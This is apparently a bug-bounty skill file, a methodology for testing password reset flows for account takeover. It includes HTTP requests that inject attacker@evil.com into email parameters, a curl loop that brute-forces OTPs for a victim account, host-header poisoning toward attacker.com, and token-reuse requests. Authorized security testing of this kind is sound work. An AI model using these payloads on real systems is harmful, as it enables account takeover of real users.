---
name: attack-password-reset
description: "Password reset flaws — token leakage via referer, array injection, OTP brute force, host poisoning, and token invalidation bypass for account takeover"
category: "authentication"
version: "1.0"
author: "bountyreper-official"
tags:
  - password-reset
  - account-takeover
  - authentication
  - otp
  - token-leakage
tech_stack:
  - web
cwe_ids:
  - CWE-640
  - CWE-308
  - CWE-200
  - CWE-613
chains_with:
  - wstg-athn-09
  - attack-waf-bypass
  - attack-open-redirect
prerequisites: []
severity_boost:
  attack-waf-bypass: "Host poisoning + password reset = token to attacker domain"
---

# Password Reset Functionality Hunting

## Objective

Find flaws in password reset flows that lead to account takeover via token leakage, array injection, OTP brute force, and improper validation.

> **Attribution:** Compiled from [KathanP19/HowToHunt — Password_Reset_Functionality](https://github.com/KathanP19/HowToHunt/tree/master/Password_Reset_Functionality) (Top 5 Bugs, Token Leakage, Array Injection, OTP Brute Force). Licensed GPL-3.0.

## Testing Methodology

### Phase 1: Token Leak via Referer

1. Request reset for your account, click link, leave page open
2. Click any 3rd-party link on reset page (e.g., Facebook, Twitter)
3. Intercept request in Burp, inspect `Referer` header:
   ```http
   GET / HTTP/1.1
   Host: facebook.com
   Referer: https://target.com/reset?token=abc123
   ```
   If token in Referer, any 3rd-party can capture it.

### Phase 2: Array Injection in Email Parameter

```http
# Original
POST /api/v1/password_reset HTTP/1.1
{"email_address":"victim@gmail.com"}

# Array injection
POST /api/v1/password_reset HTTP/1.1
{"email_address":["victim@gmail.com","attacker@evil.com"]}
```
If reset link sent to both, attacker receives token.

Test also:
```json
{"email": "victim@gmail.com,attacker@evil.com"}
{"email": {"victim@gmail.com": 0, "attacker@evil.com": 1}}
```

### Phase 3: OTP Brute Force

```bash
# If reset uses 4-6 digit OTP without rate limit
for i in {0000..9999}; do
  curl -X POST https://target.com/verify-otp -d "otp=$i&email=victim@gmail.com" | grep -q "success" && echo "Found $i" && break
done

# Check with Burp Intruder — look for no rate limit, no attempt lockout
```

Also test:
- OTP reuse (same OTP works twice)
- OTP for one email works for another
- OTP not expired after use

### Phase 4: Host Poisoning

```http
POST /reset-password HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com

email=victim@victim.com
```
Check if reset link uses `attacker.com`:

```
https://attacker.com/reset?token=...
```

### Phase 5: Token Validation Flaws

- Token not invalidated after use (reuse)
- Token predictable (incremental, timestamp-based)
- Token not bound to user (use your token to reset victim's password)
- Token in URL and logged in Referer/server logs

```bash
# Test token reuse
curl "https://target.com/reset?token=YOUR_TOKEN" # use twice

# Test token binding
# Request reset for attacker, use token with victim's email in POST
POST /reset?token=attacker_token
email=victim@gmail.com&new_password=hacked
```

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| Token leak to attacker (Referer/host poisoning/array) | Critical (P1) |
| OTP brute force without rate limit | High (P2) |
| Token not invalidated / reusable | High (P2) |
| Token predictable | High (P2) |
| Token not bound to user | Critical (P1) |

## Evidence Requirements

- Reset request and token capture
- PoC showing token to attacker (Referer log, webhook, or reset as victim)
- http_replay evidence with token reuse

## References

- [HowToHunt — Password Reset Top 5](https://github.com/KathanP19/HowToHunt/tree/master/Password_Reset_Functionality)
- [HowToHunt — Token Leakage](https://github.com/KathanP19/HowToHunt/tree/master/Password_Reset_Functionality/Password_Reset_Token_Leakage.md)
